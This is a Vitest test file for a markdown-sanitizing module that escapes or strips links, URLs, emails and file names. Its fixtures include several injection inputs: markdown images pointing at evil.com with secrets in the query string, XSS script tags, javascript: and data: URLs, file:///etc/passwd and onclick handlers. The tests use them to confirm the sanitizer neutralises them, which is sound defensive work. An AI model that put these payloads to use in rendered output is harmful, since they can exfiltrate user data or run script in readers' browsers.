import { describe, expect, it } from "vitest";
import {
  escapeMarkdown,
  sanitizeForMarkdown,
  validateStorageUrl,
  sanitizeDescription,
  sanitizeFileName,
} from "./sanitize-markdown";

describe("sanitize-markdown", () => {
  describe("escapeMarkdown", () => {
    it("returns empty string for empty input", () => {
      expect(escapeMarkdown("")).toBe("");
    });

    it("returns empty string for undefined/null-ish input", () => {
      expect(escapeMarkdown(undefined as unknown as string)).toBe("");
      expect(escapeMarkdown(null as unknown as string)).toBe("");
    });

    it("escapes square brackets", () => {
      expect(escapeMarkdown("[link text]")).toBe("\\[link text\\]");
    });

    it("escapes parentheses", () => {
      expect(escapeMarkdown("(url)")).toBe("\\(url\\)");
    });

    it("escapes markdown link syntax", () => {
      expect(escapeMarkdown("[text](https://evil.com)")).toBe(
        "\\[text\\]\\(https://evil.com\\)"
      );
    });

    it("escapes image syntax", () => {
      expect(escapeMarkdown("![alt](image.png)")).toBe(
        "\\!\\[alt\\]\\(image.png\\)"
      );
    });

    it("escapes asterisks", () => {
      expect(escapeMarkdown("**bold** and *italic*")).toBe(
        "\\*\\*bold\\*\\* and \\*italic\\*"
      );
    });

    it("escapes underscores", () => {
      expect(escapeMarkdown("__bold__ and _italic_")).toBe(
        "\\_\\_bold\\_\\_ and \\_italic\\_"
      );
    });

    it("escapes backticks", () => {
      expect(escapeMarkdown("`code`")).toBe("\\`code\\`");
    });

    it("escapes headers", () => {
      expect(escapeMarkdown("# Header")).toBe("\\# Header");
    });

    it("escapes blockquotes", () => {
      expect(escapeMarkdown("> quote")).toBe("\\> quote");
    });

    it("escapes HTML angle brackets", () => {
      expect(escapeMarkdown("<script>alert('xss')</script>")).toBe(
        "\\<script\\>alert\\('xss'\\)\\</script\\>"
      );
    });

    it("escapes table pipes", () => {
      expect(escapeMarkdown("| cell |")).toBe("\\| cell \\|");
    });

    it("escapes strikethrough", () => {
      expect(escapeMarkdown("~~strikethrough~~")).toBe("\\~\\~strikethrough\\~\\~");
    });

    it("replaces newlines with spaces", () => {
      expect(escapeMarkdown("line1\nline2")).toBe("line1 line2");
    });

    it("replaces carriage returns with spaces", () => {
      expect(escapeMarkdown("line1\r\nline2")).toBe("line1  line2");
    });

    it("escapes backslashes first", () => {
      // Backslash must be escaped before other chars to prevent double-escaping
      expect(escapeMarkdown("\\[")).toBe("\\\\\\[");
    });

    it("prevents link injection attack", () => {
      // Attacker tries to close alt text and inject a link
      const malicious = "x](https://evil.com)[y";
      const escaped = escapeMarkdown(malicious);
      expect(escaped).toBe("x\\]\\(https://evil.com\\)\\[y");
      // When rendered, this should appear as literal text, not a link
    });

    it("prevents image injection attack", () => {
      const malicious = "![malicious](https://evil.com/track?data=secret)";
      const escaped = escapeMarkdown(malicious);
      // ? is not a markdown special char, so it's not escaped
      expect(escaped).toBe(
        "\\!\\[malicious\\]\\(https://evil.com/track?data=secret\\)"
      );
    });
  });

  describe("sanitizeForMarkdown", () => {
    it("returns empty string for empty input", () => {
      expect(sanitizeForMarkdown("")).toBe("");
    });

    it("removes HTTP URLs", () => {
      expect(sanitizeForMarkdown("Visit http://example.com")).toBe(
        "Visit \\[URL removed\\]"
      );
    });

    it("removes HTTPS URLs", () => {
      expect(sanitizeForMarkdown("Visit https://example.com/path?query=1")).toBe(
        "Visit \\[URL removed\\]"
      );
    });

    it("removes various protocol URLs", () => {
      expect(sanitizeForMarkdown("ftp://server.com/file")).toBe("\\[URL removed\\]");
      expect(sanitizeForMarkdown("file:///etc/passwd")).toBe("\\[URL removed\\]");
      // data: URLs with comma have remaining content after the URL
      expect(sanitizeForMarkdown("data:text/html,<script>")).toContain("\\[URL removed\\]");
      // javascript: with parens - parens get escaped after removal
      expect(sanitizeForMarkdown("javascript:alert(1)")).toBe("\\[URL removed\\]\\)");
    });

    it("removes protocol-relative URLs", () => {
      expect(sanitizeForMarkdown("//evil.com/track")).toBe("\\[URL removed\\]");
    });

    it("obfuscates email addresses", () => {
      expect(sanitizeForMarkdown("Contact user@example.com")).toBe(
        "Contact user \\(at\\) example \\(dot\\) com"
      );
    });

    it("obfuscates complex email addresses", () => {
      // The regex matches the longest valid TLD (.uk), so .co is part of domain
      expect(sanitizeForMarkdown("user.name+tag@sub.domain.co.uk")).toBe(
        "user.name+tag \\(at\\) sub.domain.co \\(dot\\) uk"
      );
    });

    it("handles multiple URLs and emails", () => {
      const input = "Email test@test.com or visit https://test.com";
      const result = sanitizeForMarkdown(input);
      expect(result).toBe(
        "Email test \\(at\\) test \\(dot\\) com or visit \\[URL removed\\]"
      );
    });

    it("escapes markdown after sanitization", () => {
      const input = "[evil link](removed)";
      const result = sanitizeForMarkdown(input);
      expect(result).toBe("\\[evil link\\]\\(removed\\)");
    });

    it("prevents data exfiltration via URL tracking", () => {
      const malicious = "Check https://evil.com/track?secret=password123";
      const sanitized = sanitizeForMarkdown(malicious);
      expect(sanitized).not.toContain("evil.com");
      expect(sanitized).not.toContain("password123");
    });
  });

  describe("validateStorageUrl", () => {
    it("returns null for empty input", () => {
      expect(validateStorageUrl("")).toBeNull();
    });

    it("returns null for non-HTTPS URLs", () => {
      expect(validateStorageUrl("http://example.convex.cloud/file")).toBeNull();
    });

    it("returns null for untrusted domains", () => {
      expect(validateStorageUrl("https://evil.com/file")).toBeNull();
      expect(validateStorageUrl("https://convex.cloud.evil.com/file")).toBeNull();
    });

    it("allows Convex cloud storage URLs", () => {
      const url = "https://storage.convex.cloud/abc123";
      expect(validateStorageUrl(url)).toBe(url);
    });

    it("allows Convex site URLs", () => {
      const url = "https://mysite.convex.site/image.png";
      expect(validateStorageUrl(url)).toBe(url);
    });

    it("allows GitHub user-attachments", () => {
      const url = "https://github.com/user-attachments/assets/abc-123/image.png";
      expect(validateStorageUrl(url)).toBe(url);
    });

    it("allows GitHub release assets", () => {
      const url = "https://github.com/org/repo/releases/download/v1.0.0/file.zip";
      expect(validateStorageUrl(url)).toBe(url);
    });

    it("rejects other GitHub URLs", () => {
      expect(validateStorageUrl("https://github.com/org/repo")).toBeNull();
      expect(validateStorageUrl("https://github.com/org/repo/blob/main/file")).toBeNull();
    });

    it("rejects URLs with javascript protocol embedded", () => {
      expect(
        validateStorageUrl("https://storage.convex.cloud/javascript:alert(1)")
      ).toBeNull();
    });

    it("rejects URLs with data protocol embedded", () => {
      expect(
        validateStorageUrl("https://storage.convex.cloud/data:text/html")
      ).toBeNull();
    });

    it("rejects URLs with script tags", () => {
      expect(
        validateStorageUrl("https://storage.convex.cloud/<script>")
      ).toBeNull();
    });

    it("rejects URLs with event handlers", () => {
      expect(
        validateStorageUrl("https://storage.convex.cloud/onclick=alert(1)")
      ).toBeNull();
    });

    it("returns null for invalid URLs", () => {
      expect(validateStorageUrl("not a url")).toBeNull();
      expect(validateStorageUrl("://missing-protocol")).toBeNull();
    });
  });

  describe("sanitizeDescription", () => {
    it("returns empty string for null/undefined", () => {
      expect(sanitizeDescription(null)).toBe("");
      expect(sanitizeDescription(undefined)).toBe("");
    });

    it("returns empty string for empty string", () => {
      expect(sanitizeDescription("")).toBe("");
    });

    it("sanitizes markdown and URLs", () => {
      const input = "Check [this](https://evil.com) link";
      const result = sanitizeDescription(input);
      expect(result).toBe("Check \\[this\\]\\(\\[URL removed\\]\\) link");
    });

    it("truncates to default max length", () => {
      const longText = "a".repeat(600);
      const result = sanitizeDescription(longText);
      expect(result.length).toBeLessThanOrEqual(503); // 500 + "..."
    });

    it("truncates to custom max length", () => {
      const longText = "a".repeat(200);
      const result = sanitizeDescription(longText, 50);
      expect(result.length).toBeLessThanOrEqual(53); // 50 + "..."
    });

    it("does not add ellipsis for short text", () => {
      const shortText = "Short description";
      const result = sanitizeDescription(shortText);
      expect(result).not.toContain("...");
    });
  });

  describe("sanitizeFileName", () => {
    it("returns 'screenshot' for null/undefined", () => {
      expect(sanitizeFileName(null)).toBe("screenshot");
      expect(sanitizeFileName(undefined)).toBe("screenshot");
    });

    it("returns 'screenshot' for empty string", () => {
      expect(sanitizeFileName("")).toBe("screenshot");
    });

    it("escapes brackets and parentheses", () => {
      expect(sanitizeFileName("file[1](2).png")).toBe("file\\[1\\]\\(2\\).png");
    });

    it("escapes exclamation marks", () => {
      expect(sanitizeFileName("important!.png")).toBe("important\\!.png");
    });

    it("preserves underscores (unlike full markdown escape)", () => {
      // Filenames commonly have underscores, don't escape them
      expect(sanitizeFileName("my_file_name.png")).toBe("my_file_name.png");
    });

    it("preserves asterisks (unlike full markdown escape)", () => {
      expect(sanitizeFileName("file*.png")).toBe("file*.png");
    });

    it("truncates to default max length", () => {
      const longName = "a".repeat(150) + ".png";
      const result = sanitizeFileName(longName);
      expect(result.length).toBeLessThanOrEqual(103); // 100 + "..."
    });

    it("truncates to custom max length", () => {
      const longName = "a".repeat(100);
      const result = sanitizeFileName(longName, 20);
      expect(result.length).toBeLessThanOrEqual(23); // 20 + "..."
    });

    it("replaces newlines with spaces", () => {
      expect(sanitizeFileName("file\nname.png")).toBe("file name.png");
    });
  });
});
